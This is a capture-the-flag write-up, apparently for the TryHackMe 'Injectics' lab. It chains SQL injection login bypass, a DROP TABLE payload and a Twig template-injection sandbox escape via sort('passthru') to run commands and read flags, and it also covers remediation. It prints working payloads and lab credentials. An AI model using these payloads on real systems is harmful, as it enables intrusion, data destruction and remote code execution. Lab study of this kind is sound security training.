---
layout: writeup
title: "Injectics"
platform: THM
os: "Linux"
date: 2026-03-14
techniques: ["SQL Injection", "Authentication Bypass", "Server-Side Template Injection", "Twig Sandbox Escape", "Database Manipulation"]
cve: []
description: "Multi-stage injection room exploiting SQLi authentication bypass, database restoration logic, and Twig SSTI sandbox escape via overlooked sort filter"
---

# Injectics — Technical Report

> **Platform:** TryHackMe \
> **Difficulty:** `Medium` \
> **Date:** 2026-03-14 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only 

---

## 0. Executive Summary

The "Injectics" machine was found to contain multiple critical injection vulnerabilities across authentication, database logic, and template rendering layers. An unauthenticated attacker could exploit SQL injection in the login mechanism to bypass authentication, manipulate database state to trigger credential restoration, and achieve remote code execution through Server-Side Template Injection (SSTI) in Twig. The attack chain demonstrates how layered vulnerabilities can be chained together to achieve complete system compromise. Immediate remediation of input validation, parameterized queries, and template engine sandboxing is required.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"Injectics"** machine on TryHackMe.

**Objectives:**
- Bypass authentication mechanisms
- Obtain administrative panel access
- Retrieve hidden flag files via SSTI

**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.

---

## 2. Attack Chain
```
Nmap → Gobuster → mail.log disclosure → SQLi auth bypass → DB table drop → Credential restoration → Admin login → Twig SSTI → Sandbox enum → sort('passthru') bypass → RCE → Flag exfil
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `gobuster` | Directory enumeration |
| `burpsuite` | Request interception & payload testing |
| `netcat` | Listener setup (attempted reverse shell) |
| Manual browser testing | SSTI payload delivery & validation |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -oA initial 10.113.164.55
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 | Standard Ubuntu install |
| 80/tcp | HTTP | Apache/2.4.41 (Ubuntu) | Web application hosting |

**Key Observations:**
- Standard LAMP stack environment
- `PHPSESSID` cookie present (PHP backend confirmed)
- `httponly` flag **not set** on session cookie (potential session hijacking vector)

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Tools Used:** `gobuster`, manual source inspection

**Findings:**
```bash
gobuster dir -u http://10.113.164.55 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,xml,js,txt,html,bak,old
```

| Path | Status | Notes |
|------|--------|-------|
| `/login.php` | 200 | Standard user login |
| `/adminLogin007.php` | 200 | Admin-specific login endpoint |
| `/flags/` | 301 | Directory exists but listing disabled |
| `/phpmyadmin/` | 200 | MySQL management interface |
| `/mail.log` | 200 | **CRITICAL**: Exposed log file |
| `composer.json` | 200 | Dependency file revealing `twig/twig 2.14.0` |

**HTML Source Analysis:**
- Developer email found in comment: `dev@injectics.thm`
- Hint about mail storage: `<!-- Mails are stored in mail.log file-->`
- AJAX-based login via `/functions.php` endpoint

**Key Finding — Information Disclosure via mail.log:**
```
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

[...snip...]

Here are the default credentials that will be added:

| Email                     | Password               |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |
```

**Critical Intelligence:**
- Auto-restoration service ("Injectics") runs every minute
- Service re-inserts default credentials if `users` table is "deleted or corrupted"
- This suggests **intentional database manipulation** as an exploitation vector

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** SQL Injection in Authentication Logic  
**Location:** `/functions.php` (via `/login.php` AJAX handler)  
**Reasoning:** 

The authentication endpoint displayed "Invalid keywords detected" when common SQLi payloads (`OR`, `--`, `#`) were used via `/functions.php`, indicating a blacklist-based WAF. However, the direct POST endpoint `/adminLogin007.php` exhibited different filtering behavior.

Testing revealed:
- Standard payloads triggered keyword detection
- Logical operators using alternative syntax bypassed filters
- Quote characters were accepted without immediate blocking

### 6.2 Exploitation — Authentication Bypass

**Payload Testing:**
```http
POST /functions.php HTTP/1.1
[...headers...]

username=' or 'x'='x'#&password=&function=login
```

**Response:**
```json
{
  "status": "success",
  "message": "Login successful",
  "is_admin": "true",
  "first_name": "dev",
  "last_name": "dev",
  "redirect_link": "dashboard.php?isadmin=false"
}
```

**Analysis:**
- SQLi bypass successful using `' or 'x'='x'#` (classic tautology)
- Backend likely constructs query: `SELECT * FROM users WHERE email='[input]' AND password='[input]'`
- Payload closes the email string and forces `WHERE` clause to evaluate as true
- `#` comments out password check

**Client-Side Parameter Tampering:**
The server returned `isadmin=false` in the redirect, but manually navigating to:
```
http://10.113.164.55/dashboard.php?isadmin=true
```
...did not grant elevated privileges at this stage, indicating server-side validation still checks database roles.

**Result:** User-level access obtained as `dev`, but admin panel restricted.

---

## 7. Database Manipulation — Triggering Credential Restoration

### 7.1 Exploitation Logic

The `mail.log` disclosure revealed a critical design flaw:
> "I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted."

**Attack Vector:** Intentionally corrupt the database to force credential injection.

### 7.2 Execution

Using the previously discovered SQLi vector, attempted to drop or truncate the `users` table:

**Payload (via Burp Suite Repeater on `/adminLogin007.php`):**
```sql
USA'; DROP TABLE users;--
```

**Server Response:**
```
It seems like database or some important table is deleted. 
InjecticsService is running to restore it. Please wait for 1-2 minutes.
```

**Result:** 
- Service successfully triggered
- After ~90 seconds, login page restored
- Default credentials now active in database

---

## 8. Administrative Access

### 8.1 Credential Use

After restoration service completed, authenticated using disclosed credentials:
```
Email: superadmin@injectics.thm
Password: superSecurePasswd101
```

**Result:** Full administrative dashboard access achieved.

**First Flag Obtained:**
```html
<h4 class="text-center">THM{INJECTICS_ADMIN_PANEL_007}</h4>
```

---

## 9. Server-Side Template Injection (SSTI)

### 9.1 Discovery & Reconnaissance

**Finding:** `composer.json` revealed `twig/twig 2.14.0`

Twig 2.x versions are known to be vulnerable to SSTI when user input is rendered through templates without proper sandboxing.

**Entry Point:** Profile update form at `/update_profile.php`

Fields:
- Email (likely validated)
- First Name ← **TARGET**
- Last Name

### 9.2 Initial Validation

**Payload:**
```twig
{% raw %}{{7*7}}{% endraw %}
```

**Location:** `fname` field in profile update form

**Result:**
Dashboard displayed:
```
Welcome, 49!
```

✅ **SSTI Confirmed** — Server evaluates Twig expressions in user input.

### 9.3 Sandbox Enumeration

Attempted standard RCE payloads to map security policy:

| Payload | Result | Notes |
|---------|--------|-------|
| {% raw %}`{{["id"]|map("system")}}`{% endraw %} | ❌ Closure error | `map` filter requires Closure in sandbox mode |
| {% raw %}`{{["id"]|filter("system")}}`{% endraw %} | ❌ Closure error | `filter` also hardened |
| {% raw %}`{{["id"]|reduce("system")}}`{% endraw %} | ❌ Closure error | `reduce` blocked |
| {% raw %}`{{_self}}`{% endraw %} | ✅ Returns `__string_template__[hash]` | `_self` object accessible |
| {% raw %}`{{_context}}`{% endraw %} | ✅ Returns `Array` | Context accessible but can't iterate |
| {% raw %}`{{ _context|keys }}`{% endraw %} | ❌ Filter not allowed | Key enumeration blocked |
| {% raw %}`{{ source('/etc/passwd') }}`{% endraw %} | ❌ Function not allowed | File read blocked |

**Sandbox Analysis:**
The server implements a strict Twig `SecurityPolicy`:
- All callback-accepting filters (`map`, `filter`, `reduce`) enforce Closure-only arguments
- Common RCE functions (`source`, `include`) explicitly blocked
- Tag whitelist excludes `import`, `for`, potentially others
- However, **`sort` filter not mentioned in error messages** ← potential oversight

### 9.4 Sandbox Escape — sort() Filter Bypass

**Hypothesis:** If `sort` also accepts a callback but wasn't included in the Closure-only policy, it could execute system commands.

**Test Payload:**
```twig
{% raw %}{{['id', '']|sort('passthru')}}{% endraw %}
```

**Result:**
```
Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data) Array!
```

✅ **RCE Achieved** — `sort` filter accepted string-based callable.

**Root Cause Analysis:**
The SecurityPolicy likely defined:
```php
$policy->setAllowedFilters(['...', 'sort']);
// But forgot to add: 
// $policy->setAllowedFilters(['map', 'filter', 'reduce'], ['closure']);
```

The developer hardened common SSTI vectors but overlooked `sort`, which internally uses PHP's `usort()` and accepts any callable.

---

## 10. Flag Exfiltration

### 10.1 Directory Enumeration

**Command:**
```twig
{% raw %}{{['ls -la flags', '']|sort('passthru')}}{% endraw %}
```

**Output:**
```
total 12
drwxrwxr-x 2 ubuntu ubuntu 4096 Jul 18 2024 .
drwxr-xr-x 6 ubuntu ubuntu 4096 Jul 31 2024 ..
-rw-rw-r-- 1 ubuntu ubuntu   38 Jul 18 2024 5d8af1dc14503c7e4bdc8e51a3469f48.txt
```

### 10.2 File Retrieval

**Command:**
```twig
{% raw %}{{['cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt', '']|sort('passthru')}}{% endraw %}
```

**Result:**
```
Welcome, THM{5735172b6c147f4dd649872f73e0fdea} Array!
```

**Second Flag Obtained:** `THM{5735172b6c147f4dd649872f73e0fdea}`

---

## 11. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | Exposed credentials in publicly accessible log file | 🔴 Critical | `/mail.log` |
| 2 | SQL Injection in authentication logic | 🔴 Critical | `/functions.php`, `/adminLogin007.php` |
| 3 | Database restoration logic exploitable for privilege escalation | 🔴 Critical | Backend service |
| 4 | Server-Side Template Injection with RCE | 🔴 Critical | `/update_profile.php` (fname field) |
| 5 | Incomplete Twig sandbox policy (sort filter bypass) | 🔴 Critical | Template engine config |
| 6 | Session cookie missing httponly flag | 🟡 Medium | All authenticated endpoints |
| 7 | Client-side parameter (`isadmin`) attempted for authz | 🟡 Medium | `dashboard.php` |
| 8 | Directory listing disabled but files accessible | 🔵 Low | `/flags/` |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 12. Defensive Considerations

### 12.1 Indicators of Compromise

**Web Server Logs (Apache access.log):**
```
POST /functions.php - 200 - "username=' or 'x'='x'#"
POST /adminLogin007.php - 200 - "mail=USA'; DROP TABLE users;--"
POST /update_profile.php - 200 - "fname={% raw %}{{['ls -la flags', '']|sort('passthru')}}{% endraw %}"
```

**Database Logs (MySQL):**
```sql
-- Suspicious authentication queries with tautologies
SELECT * FROM users WHERE email='' or 'x'='x'#' AND password=''

-- Table destruction
DROP TABLE users;

-- Auto-restoration service execution
INSERT INTO users VALUES ('superadmin@injectics.thm', [...])
```

**Application Logs:**
```
[WARN] InjecticsService: users table not found, initiating restoration
[INFO] InjecticsService: Default credentials inserted
```

### 12.2 Security Weaknesses

1. **No Input Validation/Sanitization:**
   - User input directly concatenated into SQL queries
   - Template expressions evaluated without escaping
   - Special characters not filtered or encoded

2. **Sensitive Information Disclosure:**
   - Credentials stored in publicly accessible log file
   - `composer.json` revealing exact library versions
   - Error messages disclosing backend logic

3. **Insufficient Access Controls:**
   - Authentication bypass via SQLi
   - No rate limiting on login attempts
   - Database restoration service lacks authorization checks

4. **Template Engine Misconfiguration:**
   - Twig sandbox incomplete (missing `sort` in restricted callbacks)
   - User-controlled data rendered through template engine
   - No escaping applied to profile fields

5. **Dangerous Design Pattern:**
   - Auto-restoration service creates predictable backdoor
   - Destructive actions (DROP TABLE) achievable by low-privileged users

### 12.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Remove `/mail.log` from web root; implement proper log rotation | #1 |
| Immediate | Implement parameterized queries (prepared statements) for all database interactions | #2 |
| Immediate | Disable auto-restoration service or add strict authorization | #3 |
| Immediate | Remove Twig template rendering from user-controlled fields OR implement strict autoescape + complete sandbox policy | #4, #5 |
| Short-term | Implement WAF with positive security model (whitelist) rather than blacklist | #2 |
| Short-term | Add `HttpOnly` and `Secure` flags to session cookies | #6 |
| Short-term | Server-side role validation; remove client-side authz parameters | #7 |
| Long-term | Security code review focusing on injection vulnerabilities | All |
| Long-term | Implement Content Security Policy (CSP) headers | #4 |
| Long-term | Regular dependency updates and vulnerability scanning | #4 (Twig version) |

---

## 13. Lessons Learned

**On SQLi Filter Bypasses:**
- Blacklist-based WAFs are trivially bypassed with alternative syntax (`'x'='x'` vs `1=1`, `#` vs `--`)
- Testing multiple entry points (AJAX vs direct POST) often reveals inconsistent filtering
- Modern applications still vulnerable to classic attacks when parameterized queries aren't used

**On SSTI Sandbox Escapes:**
- Sandbox policies must be **exhaustive** — missing a single filter creates RCE
- The `sort` filter is easily overlooked because it's not in standard SSTI payload lists
- Always enumerate accessible objects ({% raw %}`_self`{% endraw %}, {% raw %}`_context`{% endraw %}) even when common filters are blocked
- Template engines should **never** render user input without strict autoescaping

**On Information Disclosure:**
- Public log files are a goldmine — always check for `.log`, `.bak`, `.old` extensions
- Developer comments in HTML source often reveal architecture details
- Dependency files (`composer.json`, `package.json`) reveal exploitable versions

**On Chaining Vulnerabilities:**
- This box demonstrated how a "medium" SQLi + "medium" design flaw = critical compromise
- The database restoration service turned a "break things" vulnerability into a privilege escalation vector
- Real-world attacks rarely rely on a single CVE — they chain multiple weaknesses

**Personal Takeaway:**
This was my first encounter with a *properly hardened* Twig sandbox. The {% raw %}`sort('passthru')`{% endraw %} bypass reinforced that **enumeration beats assumption**. When {% raw %}`map`{% endraw %}/{% raw %}`filter`{% endraw %}/{% raw %}`reduce`{% endraw %} all failed, I could have given up — but systematically testing less-common filters revealed the oversight. The patience to test edge cases is what separates a script kiddie from a penetration tester.

---

*End of Report*  
*Classification: Public — flags and sensitive values omitted*
